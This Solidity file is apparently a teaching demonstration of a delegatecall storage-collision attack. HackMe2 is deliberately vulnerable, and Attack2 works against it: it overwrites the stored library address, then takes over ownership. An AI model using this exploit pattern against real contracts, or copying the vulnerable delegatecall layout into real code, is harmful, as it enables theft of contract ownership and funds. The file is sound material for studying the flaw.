// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;
import "./console.sol";

/*
This is a more sophisticated version of the previous exploit.

1. Alice deploys Lib2 and HackMe2 with the address of Lib2
2. Eve deploys Attack2 with the address of HackMe2
3. Eve calls Attack2.attack()
4. Attack2 is now the owner of HackMe

What happened?
Notice that the state variables are not defined in the same manner in Lib2
and HackMe2. This means that calling Lib2.doSomething() will change the first
state variable inside HackMe2, which happens to be the address of lib2.

Inside attack(), the first call to doSomething() changes the address of lib2
store in HackMe2. Address of lib2 is now set to Attack2.
The second call to doSomething() calls Attack2.doSomething() and here we
change the owner.
*/

contract Lib2 {
    uint256 public someNumber;
    address public owner;

    function doSomething(uint256 _num) public {
        console.log("Lib2.doSomething() called with %d", _num);
        someNumber = _num;
        owner = address(0);
    }
}

contract HackMe2 {
    address public lib2;
    address public owner;
    uint256 public someNumber;

    constructor(address _lib2) {
        lib2 = _lib2;
        owner = msg.sender;
        console.log(
            "HackMe2.constructor() called, lib2 is %s, owner is %s",
            _lib2,
            owner
        );
    }

    function doSomething(uint256 _num) public {
        console.log("HackMe2.doSomething() called with _num=%d", _num);
        console.log("   Address(%d) is %s", _num, address(uint160(_num)));
        console.log(
            "   Address of HackMe2.lib2 before delegatecall is %s",
            lib2
        );
        console.log(
            "   Address of HackMe2.owner before delegatecall is %s",
            owner
        );
        lib2.delegatecall(
            abi.encodeWithSignature("doSomething(uint256)", _num)
        );
        console.log(
            "   Address of HackMe2.lib2 after delegatecall is %s",
            lib2
        );
        console.log(
            "   Address of HackMe2.owner after delegatecall is %s",
            owner
        );
    }
}

contract Attack2 {
    // Make sure the storage layout is the same as HackMe2
    // This will allow us to correctly update the state variables
    address public lib2;
    address public owner;
    uint256 public someNumber;

    HackMe2 public hackMe2;

    constructor(HackMe2 _hackMe2) {
        hackMe2 = HackMe2(_hackMe2);
        console.log(
            "Attack2.constructor called with the address of hackMe2: %s",
            address(_hackMe2)
        );
    }

    function attack() public {
        console.log("Attack2.attack() called");
        console.log(
            "   attack() call hackMe2.doSomething() to override the address of lib2"
        );
        // override address of lib2
        hackMe2.doSomething(uint256(uint160(address(this))));
        // pass any number as input, the function doSomething() below will
        // be called
        console.log(
            "   attack() call again hackMe2.doSomething() to change the owner :"
        );
        hackMe2.doSomething(1);
    }

    // function signature must match HackMe2.doSomething()
    function doSomething(uint256 _num) public {
        console.log("Attack2.doSomething() called with %d", _num);
        console.log(
            "   Address of HackMe2.owner before assigning owner is %s",
            owner
        );
        owner = msg.sender;
        console.log(
            "   Address of HackMe2.owner after assigning owner is %s",
            owner
        );
    }
}
